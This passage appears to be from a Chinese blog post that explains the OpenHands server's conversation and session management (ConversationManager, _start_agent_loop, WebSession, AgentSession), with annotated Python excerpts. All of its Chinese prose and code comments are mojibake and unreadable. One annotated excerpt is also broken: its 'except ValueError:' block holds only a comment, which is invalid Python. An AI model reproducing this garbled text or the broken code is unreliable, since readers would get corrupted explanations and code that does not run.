å…·æœ‰åˆ†å¸ƒå¼å¯¹è¯çŠ¶æ€çš„é›†ç¾¤éƒ¨ç½²\n    - è‡ªå®šä¹‰æŒä¹…åŒ–æˆ–ç¼“å­˜ç­–ç•¥\n    - ä¸Žå¤–éƒ¨å¯¹è¯ç®¡ç†ç³»ç»Ÿé›†æˆ\n    - å¢žå¼ºçš„ç›‘æŽ§æˆ–æ—¥å¿—èƒ½åŠ›\n    å®žçŽ°ç±»é€šè¿‡openhands.server.shared.pyä¸­çš„get_impl()æ–¹æ³•å®žä¾‹åŒ–ã€‚\n    \"\"\"\n\n    sio: socketio.AsyncServer  # Socket.IOå¼‚æ­¥æœåŠ¡å™¨å®žä¾‹ï¼Œç”¨äºŽå®žæ—¶é€šä¿¡\n    config: OpenHandsConfig    # OpenHandsé…ç½®å¯¹è±¡ï¼Œå­˜å‚¨ç³»ç»Ÿå‚æ•°\n    file_store: FileStore      # æ–‡ä»¶å­˜å‚¨å®žä¾‹ï¼Œç”¨äºŽç®¡ç†å¯¹è¯ç›¸å…³æ–‡ä»¶\n    conversation_store: ConversationStore  # å¯¹è¯å­˜å‚¨å®žä¾‹ï¼Œç”¨äºŽæŒä¹…åŒ–å¯¹è¯æ•°æ®\n</code></pre>\n<h4 id=\"211-standaloneconversationmanager\">2.1.1 StandaloneConversationManager</h4>\n<p>StandaloneConversationManager æ˜¯ConversationManagerçš„å­ç±»ã€‚æ˜¯é»˜è®¤å®žçŽ°ï¼Œé€‚ç”¨äºŽå•æœåŠ¡å™¨éƒ¨ç½²åœºæ™¯ã€‚</p>\n<pre><code class=\"language-python\">@dataclass\nclass StandaloneConversationManager(ConversationManager):\n    \"\"\"Default implementation of ConversationManager for single-server deployments.\n\n    See ConversationManager for extensibility details.\n    \"\"\"\n\n    sio: socketio.AsyncServer\n    config: OpenHandsConfig\n    file_store: FileStore\n    server_config: ServerConfig\n    # Defaulting monitoring_listener for temp backward compatibility.\n    monitoring_listener: MonitoringListener = MonitoringListener()\n    _local_agent_loops_by_sid: dict[str, Session] = field(default_factory=dict)\n    _local_connection_id_to_session_id: dict[str, str] = field(default_factory=dict)\n    _active_conversations: dict[str, tuple[ServerConversation, int]] = field(\n        default_factory=dict\n    )\n    _detached_conversations: dict[str, tuple[ServerConversation, float]] = field(\n        default_factory=dict\n    )\n    _conversations_lock: asyncio.Lock = field(default_factory=asyncio.Lock)\n    _cleanup_task: asyncio.Task | None = None\n    _conversation_store_class: type[ConversationStore] | None = None\n    _loop: asyncio.AbstractEventLoop | None = None\n\n</code></pre>\n<h4 id=\"212-sessionåˆå§‹åŒ–\">2.1.2 Sessionåˆå§‹åŒ–</h4>\n<p>Sessionåˆå§‹åŒ–çš„æµç¨‹å›¾å¦‚ä¸‹ã€‚</p>\n<p><img alt=\"openhands-4.1-1\" class=\"lazyload\" /></p>\n<p>StandaloneConversationManager çš„  join_conversation å‡½æ•°å¦‚ä¸‹ï¼Œå…¶è°ƒç”¨äº† maybe_start_agent_loop åˆå§‹åŒ–Agentã€‚éœ€è¦æ³¨æ„ï¼Œæ­¤å¤„ Session æ˜¯ WebSessionã€‚</p>\n<pre><code class=\"language-python\">    from openhands.server.session.session import WebSession as Session\n\n    async def join_conversation(\n        self,\n        sid: str,\n        connection_id: str,\n        settings: Settings,\n        user_id: str | None,\n    ) -&gt; AgentLoopInfo:\n        await self.sio.enter_room(connection_id, ROOM_KEY.format(sid=sid))\n        self._local_connection_id_to_session_id[connection_id] = sid\n        # æ­¤å¤„è°ƒç”¨ maybe_start_agent_loop\n        agent_loop_info = await self.maybe_start_agent_loop(sid, settings, user_id)\n        return agent_loop_info\n\n</code></pre>\n<p>maybe_start_agent_loop è°ƒç”¨äº† _start_agent_loop åˆå§‹åŒ– Sessionã€‚</p>\n<pre><code class=\"language-python\">class ConversationManager:\n    def __init__(self, config: OpenHandsConfig, sio: Any, file_store: Any):\n        self.config = config  # æ¡†æž¶å…¨å±€é…ç½®\n        self.sio = sio  # SocketIOå®žä¾‹ï¼ˆç”¨äºŽå®¢æˆ·ç«¯é€šä¿¡ï¼‰\n        self.file_store = file_store  # æ–‡ä»¶å­˜å‚¨å®žä¾‹ï¼ˆç”¨äºŽä¼šè¯æ•°æ®æŒä¹…åŒ–ï¼‰\n        self._local_agent_loops_by_sid: Dict[str, Session] = {}  # ä¼šè¯IDåˆ°Sessionå®žä¾‹çš„æ˜ å°„ï¼ˆç¼“å­˜æ´»è·ƒä¼šè¯ï¼‰\n        self._loop = asyncio.get_event_loop()  # äº‹ä»¶å¾ªçŽ¯å®žä¾‹\n\n    async def maybe_start_agent_loop(\n        self,\n        sid: str,  # ä¼šè¯IDï¼ˆå”¯ä¸€æ ‡è¯†ä¸€ä¸ªå¯¹è¯ï¼‰\n        settings: Settings,  # ç”¨æˆ·/ä¼šè¯è®¾ç½®ï¼ˆå«Agentç±»åž‹ã€LLMé…ç½®ç­‰ï¼‰\n        user_id: Optional[str] = None,  # ç”¨æˆ·IDï¼ˆå¯é€‰ï¼Œç”¨äºŽç”¨æˆ·çº§å¹¶å‘æŽ§åˆ¶ï¼‰\n        initial_user_msg: Optional[MessageAction] = None,  # åˆå§‹ç”¨æˆ·æ¶ˆæ¯ï¼ˆå¯é€‰ï¼Œä¼šè¯å¯åŠ¨æ—¶çš„ç¬¬ä¸€æ¡æ¶ˆæ¯ï¼‰\n        replay_json: Optional[str] = None,  # å›žæ”¾JSONå­—ç¬¦ä¸²ï¼ˆå¯é€‰ï¼Œç”¨äºŽä¼šè¯å›žæ”¾åœºæ™¯ï¼‰\n    ) -&gt; AgentLoopInfo:\n        \"\"\"\n        å°è¯•å¯åŠ¨Agentå¾ªçŽ¯ï¼šä¼˜å…ˆå¤ç”¨å·²å­˜åœ¨çš„ä¼šè¯ï¼Œä¸å­˜åœ¨åˆ™æ–°å»ºã€‚\n        \n        æ ¸å¿ƒé€»è¾‘ï¼š\n        - æ£€æŸ¥ä¼šè¯IDå¯¹åº”çš„ä¼šè¯æ˜¯å¦å·²å­˜åœ¨ï¼ˆç¼“å­˜äºŽ_local_agent_loops_by_sidï¼‰\n        - å­˜åœ¨åˆ™ç›´æŽ¥è¿”å›žä¼šè¯ä¿¡æ¯ï¼Œä¸å­˜åœ¨åˆ™è°ƒç”¨_start_agent_loopæ–°å»ºä¼šè¯\n        - è¿”å›žæ ‡å‡†åŒ–çš„Agentå¾ªçŽ¯ä¿¡æ¯ï¼ˆä¾›å¤–éƒ¨è°ƒç”¨è€…ä½¿ç”¨ï¼‰\n        \"\"\"     \n        # ä»Žç¼“å­˜ä¸­èŽ·å–ä¼šè¯ï¼ˆå¤ç”¨å·²æœ‰ä¼šè¯ï¼Œé¿å…é‡å¤åˆå§‹åŒ–ï¼‰\n        session = self._local_agent_loops_by_sid.get(sid)\n        if not session:\n            # ä¼šè¯ä¸å­˜åœ¨ï¼Œæ–°å»ºAgentå¾ªçŽ¯\n            session = await self._start_agent_loop(\n                sid, settings, user_id, initial_user_msg, replay_json\n            )\n        \n        # å°†Sessionå®žä¾‹è½¬æ¢ä¸ºæ ‡å‡†åŒ–çš„AgentLoopInfoè¿”å›ž\n        return self._agent_loop_info_from_session(session)\n</code></pre>\n<p>_start_agent_loop è¯¥ä»£ç æ˜¯ OpenHands æ¡†æž¶ä¸­ <strong>Agentå¾ªçŽ¯ï¼ˆAgent Loopï¼‰çš„å¯åŠ¨ä¸Žç®¡ç†æ ¸å¿ƒ</strong>ï¼Œè´Ÿè´£ä¼šè¯çš„åˆ›å»ºã€å¤ç”¨ã€å¹¶å‘æŽ§åˆ¶å’Œåˆå§‹åŒ–ï¼Œæ˜¯è¿žæŽ¥ç”¨æˆ·è¯·æ±‚ä¸ŽAgentæ‰§è¡Œçš„å…³é”®æž¢çº½ã€‚å…¶æ ¸å¿ƒä½¿å‘½æ˜¯ï¼šåœ¨éµå®ˆå¹¶å‘é™åˆ¶çš„å‰æä¸‹ï¼Œä¸ºç”¨æˆ·ä¼šè¯æä¾›å®Œæ•´çš„ç»„ä»¶åˆå§‹åŒ–ï¼ˆLLM æ³¨å†Œè¡¨ã€ç»Ÿè®¡ã€äº‹ä»¶è®¢é˜…ï¼‰ï¼Œç¡®ä¿Agentèƒ½å¤Ÿé¡ºç•…å¯åŠ¨å¹¶è¿è¡Œã€‚</p>\n<p>_start_agent_loop  çš„æ ¸å¿ƒç‰¹è‰²å¦‚ä¸‹ï¼š</p>\n<ol>\n<li><strong>ä¼šè¯å¤ç”¨æœºåˆ¶</strong>ï¼šé€šè¿‡ <code>_local_agent_loops_by_sid</code> ç¼“å­˜æ´»è·ƒä¼šè¯ï¼Œé¿å…é‡å¤åˆå§‹åŒ–ï¼Œæå‡å“åº”é€Ÿåº¦å’Œèµ„æºåˆ©ç”¨çŽ‡ï¼ˆä¾‹å¦‚ç”¨æˆ·é‡æ–°è¿žæŽ¥åŒä¸€ä¼šè¯æ—¶ç›´æŽ¥å¤ç”¨ï¼‰ã€‚</li>\n<li><strong>æ™ºèƒ½å¹¶å‘æŽ§åˆ¶</strong>ï¼šåŸºäºŽç”¨æˆ· ID é™åˆ¶æœ€å¤§å¹¶å‘ä¼šè¯æ•°ï¼Œè¶…é™åŽè‡ªåŠ¨å…³é—­æœ€æ—©çš„ä¼šè¯ï¼ŒåŒæ—¶å‘å®¢æˆ·ç«¯å‘é€å‹å¥½é€šçŸ¥ï¼Œå¹³è¡¡èµ„æºå ç”¨ä¸Žç”¨æˆ·ä½“éªŒã€‚</li>\n<li><strong>ç»„ä»¶åŒ–åˆå§‹åŒ–</strong>ï¼šæ•´åˆ <code>create_registry_and_conversation_stats</code> å‡½æ•°ï¼Œä¸€é”®å®Œæˆ LLM æ³¨å†Œè¡¨ã€å¯¹è¯ç»Ÿè®¡ã€é…ç½®é€‚é…ä¸‰å¤§æ ¸å¿ƒç»„ä»¶çš„åˆå§‹åŒ–ï¼Œæž¶æž„æ¸…æ™°ä¸”è§£è€¦ã€‚</li>\n<li><strong>å¼‚æ­¥éžé˜»å¡žè®¾è®¡</strong>ï¼šAgentåˆå§‹åŒ–ï¼ˆ<code>session.initialize_agent</code>ï¼‰é€šè¿‡ <code>asyncio.create_task</code> å¼‚æ­¥æ‰§è¡Œï¼Œä¸é˜»å¡žä¼šè¯åˆ›å»ºæµç¨‹ï¼Œæå‡ç³»ç»Ÿåžåé‡ã€‚</li>\n<li><strong>äº‹ä»¶é©±åŠ¨æ‰©å±•</strong>ï¼šè‡ªåŠ¨è®¢é˜…ä¼šè¯äº‹ä»¶æµï¼Œé€šè¿‡å›žè°ƒå‡½æ•°å“åº”ä¼šè¯æ›´æ–°ï¼Œæ”¯æŒåŽç»­æ‰©å±•ç›‘æŽ§ã€ç»Ÿè®¡ç­‰åŠŸèƒ½ï¼Œå…·å¤‡è‰¯å¥½çš„å¯æ‰©å±•æ€§ã€‚</li>\n<li><strong>å®¹é”™ä¸Žå…¼å®¹æ€§</strong>ï¼šå¤„ç†é‡å¤è®¢é˜…å¼‚å¸¸ï¼Œé¿å…æŠ¥é”™ï¼›æ”¯æŒä¼šè¯å›žæ”¾ï¼ˆ<code>replay_json</code>ï¼‰å’Œåˆå§‹æ¶ˆæ¯ï¼ˆ<code>initial_user_msg</code>ï¼‰ï¼Œé€‚é…æ­£å¸¸å¯¹è¯ã€å›žæ”¾ç­‰å¤šç§åœºæ™¯ã€‚</li>\n</ol>\n<p>_start_agent_loop ä»£ç å¦‚ä¸‹ã€‚</p>\n<pre><code class=\"language-python\">    async def _start_agent_loop(\n        self,\n        sid: str,\n        settings: Settings,\n        user_id: Optional[str] = None,\n        initial_user_msg: Optional[MessageAction] = None,\n        replay_json: Optional[str] = None,\n    ) -&gt; Session:\n        \"\"\"\n        å†…éƒ¨æ–¹æ³•ï¼šå®žé™…åˆ›å»ºå¹¶å¯åŠ¨Agentå¾ªçŽ¯ï¼ŒåŒ…å«å¹¶å‘æŽ§åˆ¶ã€ä¼šè¯åˆå§‹åŒ–ã€äº‹ä»¶è®¢é˜…ç­‰æ ¸å¿ƒæµç¨‹ã€‚\n        \"\"\"\n        # 1. å¹¶å‘ä¼šè¯æ•°é‡æŽ§åˆ¶ï¼šæ£€æŸ¥ç”¨æˆ·å½“å‰æ´»è·ƒä¼šè¯æ•°æ˜¯å¦è¶…è¿‡ä¸Šé™\n        # èŽ·å–ç”¨æˆ·å½“å‰è¿è¡Œä¸­çš„æ‰€æœ‰ä¼šè¯ID\n        running_session_ids = await self.get_running_agent_loops(user_id)\n        # è‹¥è¶…è¿‡æœ€å¤§å¹¶å‘æ•°ï¼Œå…³é—­æœ€æ—©çš„ä¼šè¯ä»¥é‡Šæ”¾èµ„æº\n        if len(running_session_ids) &gt;= self.config.max_concurrent_conversations:\n           \n            # èŽ·å–ç”¨æˆ·çš„ä¼šè¯å­˜å‚¨å®žä¾‹ï¼Œè¯»å–æ‰€æœ‰æ´»è·ƒä¼šè¯çš„å…ƒæ•°æ®\n            conversation_store = await self._get_conversation_store(user_id)\n            conversations = await conversation_store.get_all_metadata(running_session_ids)\n            # æŒ‰æœ€åŽæ›´æ–°æ—¶é—´æŽ’åºï¼ˆæœ€æ–°çš„åœ¨å‰ï¼Œ oldestçš„åœ¨åŽï¼‰\n            conversations.sort(key=_last_updated_at_key, reverse=True)\n\n            # å¾ªçŽ¯å…³é—­æœ€æ—©çš„ä¼šè¯ï¼Œç›´åˆ°å¹¶å‘æ•°ç¬¦åˆé™åˆ¶\n            while len(conversations) &gt;= self.config.max_concurrent_conversations:\n                oldest_conversation = conversations.pop()  # å–å‡ºæœ€æ—©çš„ä¼šè¯\n                oldest_sid = oldest_conversation.conversation_id\n               \n                # å‘å®¢æˆ·ç«¯å‘é€é”™è¯¯é€šçŸ¥ï¼ˆå‘ŠçŸ¥ä¼šè¯å·²å…³é—­ï¼‰\n                status_update = {\n                    'status_update': True,\n                    'type': 'error',\n                    'id': 'AGENT_ERROR$TOO_MANY_CONVERSATIONS',\n                    'message': 'åŒæ—¶å¼€å¯çš„ä¼šè¯æ•°å·²è¾¾ä¸Šé™ã€‚è‹¥ä»éœ€ä½¿ç”¨è¯¥ä¼šè¯ï¼Œå¯å‘é€æ¶ˆæ¯é‡æ–°æ¿€æ´»Agent',\n                }\n                # åœ¨äº‹ä»¶å¾ªçŽ¯ä¸­å‘é€SocketIOäº‹ä»¶ï¼ˆå®šå‘åˆ°è¯¥ä¼šè¯çš„æˆ¿é—´ï¼‰\n                await run_in_loop(\n                    self.sio.emit(\n                        'oh_event',\n                        status_update,\n                        to=ROOM_KEY.format(sid=oldest_sid),  # æŒ‰ä¼šè¯IDå®šå‘å‘é€\n                    ),\n                    self._loop,\n                )\n                \n                # å…³é—­æœ€æ—©çš„ä¼šè¯ï¼ˆé‡Šæ”¾èµ„æºï¼‰\n                await self.close_session(oldest_sid)\n\n        # 2. åˆå§‹åŒ–æ ¸å¿ƒç»„ä»¶ï¼šLLMæ³¨å†Œè¡¨ã€å¯¹è¯ç»Ÿè®¡ã€æœ€ç»ˆé…ç½®\n        llm_registry, conversation_stats, final_config = (\n            create_registry_and_conversation_stats(self.config, sid, user_id, settings)\n        )\n        \n        # 3. åˆ›å»ºSessionå®žä¾‹ï¼ˆå°è£…ä¼šè¯çš„æ‰€æœ‰çŠ¶æ€å’Œç»„ä»¶ï¼‰\n        session = Session(\n            sid=sid,\n            file_store=self.file_store,  # ç»‘å®šæ–‡ä»¶å­˜å‚¨\n            config=final_config,  # ç»‘å®šæœ€ç»ˆé…ç½®\n            llm_registry=llm_registry,  # ç»‘å®šLLMæ³¨å†Œè¡¨\n            conversation_stats=conversation_stats,  # ç»‘å®šå¯¹è¯ç»Ÿè®¡\n            sio=self.sio,  # ç»‘å®šSocketIOå®žä¾‹\n            user_id=user_id,  # ç»‘å®šç”¨æˆ·ID\n        )\n        \n        # 4. å°†æ–°ä¼šè¯ç¼“å­˜åˆ°æœ¬åœ°ï¼ˆä¾›åŽç»­å¤ç”¨ï¼‰\n        self._local_agent_loops_by_sid[sid] = session\n        \n        # 5. å¼‚æ­¥åˆå§‹åŒ–Agentï¼ˆä¸é˜»å¡žå½“å‰æµç¨‹ï¼‰ï¼šåŠ è½½Agentã€å¤„ç†åˆå§‹æ¶ˆæ¯ã€å›žæ”¾ä¼šè¯ï¼ˆè‹¥æœ‰ï¼‰\n        asyncio.create_task(\n            session.initialize_agent(settings, initial_user_msg, replay_json)\n        )\n        \n        # 6. è®¢é˜…ä¼šè¯äº‹ä»¶æµï¼šç›‘å¬ä¼šè¯æ›´æ–°äº‹ä»¶ï¼ˆä»…æ–°å»ºä¼šè¯æ—¶è®¢é˜…ï¼Œå¤ç”¨ä¼šè¯è·³è¿‡ï¼‰\n        try:\n            session.agent_session.event_stream.subscribe(\n                subscriber=EventStreamSubscriber.SERVER,  # è®¢é˜…è€…ç±»åž‹ï¼šæœåŠ¡å™¨\n                callback=self._create_conversation_update_callback(\n                    user_id, sid, settings, llm_registry  # ä¼šè¯æ›´æ–°å›žè°ƒå‡½æ•°\n                ),\n                callback_id=UPDATED_AT_CALLBACK_ID,  # å›žè°ƒIDï¼ˆç”¨äºŽåŽç»­å–æ¶ˆè®¢é˜…ï¼‰\n            )\n        except ValueError:\n            # è‹¥å·²å­˜åœ¨ç›¸åŒIDçš„è®¢é˜…ï¼Œå¿½ç•¥è¯¥æ“ä½œï¼ˆé¿å…é‡å¤è®¢é˜…ï¼‰\n\n        # è¿”å›žåˆ›å»ºå¥½çš„Sessionå®žä¾‹\n        return session\n</code></pre>\n<h3 id=\"22-sessionpywebsession\">2.2 session.pyï¼ˆWebSessionï¼‰</h3>\n<p>session.py å®šä¹‰äº† WebSession ç±»ï¼Œå®ƒæ˜¯ OpenHands ç³»ç»Ÿä¸­ç®¡ç† Web å®¢æˆ·ç«¯ä¼šè¯çš„æ ¸å¿ƒç»„ä»¶ã€‚</p>\n<h4 id=\"221-websession-ç±»æ¦‚è¿°\">2.2.1 WebSession ç±»æ¦‚è¿°</h4>\n<p>WebSession æ˜¯ä¸€ä¸ª Web æœåŠ¡å™¨ç»‘å®šçš„ä¼šè¯åŒ…è£…å™¨ï¼Œè´Ÿè´£ç®¡ç†å•ä¸ª Web å®¢æˆ·ç«¯è¿žæŽ¥å¹¶åè°ƒ AgentSession ç”Ÿå‘½å‘¨æœŸã€‚WebSession çš„å…³é”®è®¾è®¡æ¨¡å¼ä¸ºï¼š</p>\n<ul>\n<li>å¼‚æ­¥é˜Ÿåˆ—æ¨¡å¼ï¼šä½¿ç”¨ asyncio.Queue ç®¡ç†äº‹ä»¶å‘å¸ƒï¼Œç¡®ä¿éžé˜»å¡žæ“ä½œ</li>\n<li>äº‹ä»¶é©±åŠ¨æž¶æž„ï¼šé€šè¿‡äº‹ä»¶è®¢é˜…/å‘å¸ƒæœºåˆ¶å®žçŽ°ç»„ä»¶è§£è€¦</li>\n<li>çŠ¶æ€ç®¡ç†æ¨¡å¼ï¼šè·Ÿè¸ªä¼šè¯çŠ¶æ€å’Œè¿žæŽ¥çŠ¶æ€</li>\n<li>é”™è¯¯å¤„ç†æœºåˆ¶ï¼šå…¨é¢çš„å¼‚å¸¸æ•èŽ·å’Œé”™è¯¯æŠ¥å‘Š</li>\n</ul>\n<p>WebSession æ˜¯ OpenHands ç³»ç»Ÿä¸­è¿žæŽ¥å‰ç«¯ç”¨æˆ·ç•Œé¢å’ŒåŽç«¯Agentæ‰§è¡Œçš„æ ¸å¿ƒæ¡¥æ¢ï¼Œè´Ÿè´£åè°ƒæ•´ä¸ªäº¤äº’æµç¨‹ã€‚</p>\n<h4 id=\"222-websession-æ ¸å¿ƒå±žæ€§\">2.2.2 WebSession æ ¸å¿ƒå±žæ€§</h4>\n<p>WebSession æ ¸å¿ƒå±žæ€§ä¸ºï¼š</p>\n<ul>\n<li>sidï¼šç¨³å®šçš„ä¼šè¯ IDï¼Œè·¨ä¼ è¾“ä¿æŒä¸€è‡´</li>\n<li>sioï¼šSocket.IO æœåŠ¡å™¨ï¼Œç”¨äºŽå‘ Web å®¢æˆ·ç«¯å‘é€äº‹ä»¶</li>\n<li>agent_sessionï¼šæ ¸å¿ƒAgentä¼šè¯ï¼Œåè°ƒè¿è¡Œæ—¶å’Œ LLM</li>\n<li>configï¼šæœ‰æ•ˆçš„ OpenHands é…ç½®</li>\n<li>llm_registryï¼šè´Ÿè´£ LLM è®¿é—®å’Œé‡è¯•é’©å­çš„æ³¨å†Œè¡¨</li>\n<li>file_storeï¼šä¼šè¯çš„æ–‡ä»¶å­˜å‚¨æŽ¥å£</li>\n<li>user_idï¼šå¯é€‰çš„å¤šç§Ÿæˆ·ç”¨æˆ·æ ‡è¯†ç¬¦</li>\n</ul>\n<p>WebSessionä¼šè®¢é˜… EventStreamSubscriber.SERVERã€‚</p>\n<pre><code class=\"language-python\">class WebSession:\n    \"\"\"Web server-bound session wrapper.\n\n    This was previously named `Session`. We keep `Session` as a compatibility alias\n    (see openhands.server.session.__init__) so downstream imports/tests continue to\n    work. The class manages a single web client connection and orchestrates the\n    AgentSession lifecycle for that conversation.\n    \"\"\"\n\n    sid: str\n    sio: socketio.AsyncServer | None\n    last_active_ts: int = 0\n    is_alive: bool = True\n    agent_session: AgentSession\n    loop: asyncio.AbstractEventLoop\n    config: OpenHandsConfig\n    llm_registry: LLMRegistry\n    file_store: FileStore\n    user_id: str | None\n    logger: LoggerAdapter\n</code></pre>\n<h4 id=\"223-ä¸»è¦åŠŸèƒ½æ¨¡å—\">2.2.3 ä¸»è¦åŠŸèƒ½æ¨¡å—</h4>\n<p>WebSession çš„ä¸»è¦åŠŸèƒ½æ¨¡å—ä¸ºï¼š</p>\n<ul>\n<li>åˆå§‹åŒ–å’Œé…ç½®ç®¡ç†\n<ul>\n<li>init æ–¹æ³•è®¾ç½®ä¼šè¯çš„åŸºæœ¬é…ç½®å’Œç»„ä»¶</li>\n<li>è®¢é˜… EventStream çš„ SERVER äº‹ä»¶</li>\n<li>åˆå§‹åŒ–å¼‚æ­¥äº‹ä»¶å‘å¸ƒé˜Ÿåˆ—</li>\n<li>Agentåˆå§‹åŒ–ï¼ˆinitialize_agentï¼‰</li>\n<li>é…ç½®Agentã€LLM å’Œè¿è¡Œæ—¶çŽ¯å¢ƒ</li>\n<li>å¤„ç† MCPï¼ˆModel Context Protocolï¼‰é…ç½®</li>\n<li>è®¾ç½® condenserï¼ˆåŽ‹ç¼©å™¨ï¼‰é…ç½®</li>\n<li>å¯åŠ¨ AgentSession</li>\n<li>é”™è¯¯å¤„ç†å’ŒéªŒè¯</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li>äº‹ä»¶å¤„ç†ï¼ˆon_event å’Œ _on_eventï¼‰\n<ul>\n<li>å¤„ç†æ¥è‡ªAgentçš„äº‹ä»¶\n<ul>\n<li>è¿‡æ»¤ NullAction å’Œ NullObservation</li>\n<li>æ ¹æ®äº‹ä»¶æºå†³å®šå¦‚ä½•å¤„ç†å’Œè½¬å‘äº‹ä»¶</li>\n<li>å°†çŽ¯å¢ƒåé¦ˆä½œä¸ºAgentäº‹ä»¶å‘é€ç»™ UI</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>æ¶ˆæ¯åˆ†å‘ï¼ˆdispatchï¼‰\n<ul>\n<li>å¤„ç†æ¥è‡ªç”¨æˆ·çš„äº‹ä»¶</li>\n<li>éªŒè¯å›¾åƒæ”¯æŒ</li>\n<li>å°†äº‹ä»¶æ·»åŠ åˆ°äº‹ä»¶æµä¸­</li>\n</ul>\n</li>\n<li>å¼‚æ­¥æ¶ˆæ¯å‘é€ï¼ˆsend, _monitor_publish_queue, _sendï¼‰\n<ul>\n<li>ä½¿ç”¨é˜Ÿåˆ—æœºåˆ¶å¼‚æ­¥å‘é€æ¶ˆæ¯</li>\n<li>ç¡®ä¿ WebSocket è¿žæŽ¥ç¨³å®šåŽå†å‘é€</li>\n<li>å¤„ç†è¿žæŽ¥çŠ¶æ€å’Œé”™è¯¯</li>\n</ul>\n</li>\n<li>çŠ¶æ€ç®¡ç†\n<ul>\n<li>close æ–¹æ³•æ¸…ç†ä¼šè¯èµ„æº</li>\n<li>queue_status_message å’Œ _send_status_message å¤„ç†çŠ¶æ€æ›´æ–°æ¶ˆæ¯</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"224-ä¸Žç³»ç»Ÿå…¶ä»–ç»„ä»¶çš„å…³ç³»\">2.2.4 ä¸Žç³»ç»Ÿå…¶ä»–ç»„ä»¶çš„å…³ç³»</h4>\n<p>WebSession ä¸Žç³»ç»Ÿå…¶ä»–ç»„ä»¶çš„å…³ç³»å¦‚ä¸‹ï¼š</p>\n<ul>\n<li>\n<p>ä¸Ž EventStream é›†æˆ</p>\n<ul>\n<li>ä½œä¸º SERVER è®¢é˜…è€…æŽ¥æ”¶äº‹ä»¶</li>\n<li>å¤„ç†æ¥è‡ªAgentå’Œç”¨æˆ·çš„äº‹ä»¶æµ</li>\n</ul>\n</li>\n<li>\n<p>ä¸Ž AgentSession åä½œï¼š</p>\n<ul>\n<li>ç®¡ç† AgentSession ç”Ÿå‘½å‘¨æœŸ</li>\n<li>è½¬å‘ç”¨æˆ·äº‹ä»¶åˆ°Agent</li>\n<li>å°†Agentå“åº”å‘é€ç»™å®¢æˆ·ç«¯</li>\n</ul>\n</li>\n<li>\n<p>ä¸Ž Socket.IO é›†æˆï¼š</p>\n<ul>\n<li>ä½¿ç”¨ Socket.IO å‘å®¢æˆ·ç«¯å‘é€å®žæ—¶äº‹ä»¶</li>\n<li>ç®¡ç† WebSocket è¿žæŽ¥çŠ¶æ€</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"225-åˆå§‹åŒ–-agentsession\">2.2.5 åˆå§‹åŒ– AgentSession</h4>\n<p>WebSession çš„åˆå§‹åŒ–ä¼šä¸­å®Œæˆå¯¹<code>AgentSession</code>çš„åˆå§‹åŒ–ï¼Œ<code>AgentSession</code>çš„åˆå§‹åŒ–ä¸­åˆåšäº†<code>EventStream</code>çš„åˆå§‹åŒ–ï¼Œæ‰€ä»¥æ•´ä¸ªä¼šè¯çš„<code>EventStream</code>ä¹Ÿå°±æ˜¯åœ¨è¿™é‡Œåˆ›å»ºçš„ï¼Œè¿™é‡Œåœ¨äº‹ä»¶æµä¸­è®¢é˜…äº†<code>EventStreamSubscriber.SERVER</code>ï¼Œäº‹ä»¶å›žè°ƒå‡½æ•°ä¸­å°†éœ€è¦å‘å‰ç«¯å¹¿æ’­çš„äº‹ä»¶é€šè¿‡socketè¿›è¡Œå‘é€ã€‚</p>\n<pre><code class=\"language-python\">class WebSession:\n    def __init__(\n        self,\n        sid: str,\n        config: OpenHandsConfig,\n        llm_registry: LLMRegistry,\n        conversation_stats: ConversationStats,\n        file_store: FileStore,\n        sio: socketio.AsyncServer | None,\n        user_id: str | None = None,\n    ):\n        self.sid = sid\n        self.sio = sio\n        self.last_active_ts = int(time.time())\n        self.file_store = file_store\n        self.logger = OpenHandsLoggerAdapter(extra={'session_id': sid})\n        self.llm_registry = llm_registry\n        self.conversation_stats = conversation_stats\n        self.agent_session = AgentSession(\n            sid,\n            file_store,\n            llm_registry=self.llm_registry,\n            conversation_stats=conversation_stats,\n            status_callback=self.queue_status_message,\n            user_id=user_id,\n        )\n        self.agent_session.event_stream.subscribe(\n            EventStreamSubscriber.SERVER, self.on_event, self.sid\n        )\n        self.config = config\n\n        # Lazy import to avoid ircular dependency\n        from openhands.experiments.experiment_manager import ExperimentManagerImpl\n\n        self.config = ExperimentManagerImpl.run_config_variant_test(\n            user_id, sid, self.config\n        )\n        self.loop = asyncio.get_event_loop()\n        self.user_id = user_id\n\n        self._publish_queue: asyncio.Queue = asyncio.Queue()\n        self._monitor_publish_queue_task: asyncio.Task = self.loop.create_task(\n            self._monitor_publish_queue()\n        )\n        self._wait_websocket_initial_complete: bool = True\n</code></pre>\n<p><code>agent_session.start()</code>ä¸­å®Œæˆäº†security_analyzerã€runtimeã€memoryã€controllerçš„åˆå§‹åŒ–ã€‚</p>\n<h3 id=\"23-agent_session\">2.3 agent_session</h3>\n<h4 id=\"231-agentsession\">2.3.1 AgentSession</h4>\n<p><code>AgentSession</code> æ˜¯ OpenHands æ¡†æž¶ä¸­ <strong>Agentè¿è¡Œçš„ â€œä¸Šä¸‹æ–‡å®¹å™¨â€</strong>ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯å°è£…Agentæ‰§è¡Œæ‰€éœ€çš„æ‰€æœ‰ç»„ä»¶ï¼ˆAgentã€æŽ§åˆ¶å™¨ã€è¿è¡Œæ—¶ã€å†…å­˜ã€äº‹ä»¶æµï¼‰ï¼Œç»Ÿä¸€ç®¡ç†å®ƒä»¬çš„ç”Ÿå‘½å‘¨æœŸï¼ˆåˆå§‹åŒ–ã€å¯åŠ¨ã€é€šä¿¡ã€å…³é—­ï¼‰ï¼Œå¹¶æä¾›ä¼šè¯çº§çš„é…ç½®éš”ç¦»ã€æ•°æ®æŒä¹…åŒ–å’ŒçŠ¶æ€ç®¡ç†ï¼Œæ˜¯Agentèƒ½å¤Ÿç‹¬ç«‹ã€ç¨³å®šæ‰§è¡Œä»»åŠ¡çš„åŸºç¡€ã€‚</p>\n<p>AgentSession æ ¸å¿ƒç‰¹è‰²å¦‚ä¸‹ï¼š</p>\n<ol>\n<li><strong>å…¨ç»„ä»¶ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>ï¼šé›†ä¸­åˆå§‹åŒ–å¹¶å…³è”Agentã€æŽ§åˆ¶å™¨ã€è¿è¡Œæ—¶ã€å†…å­˜ã€äº‹ä»¶æµç­‰æ 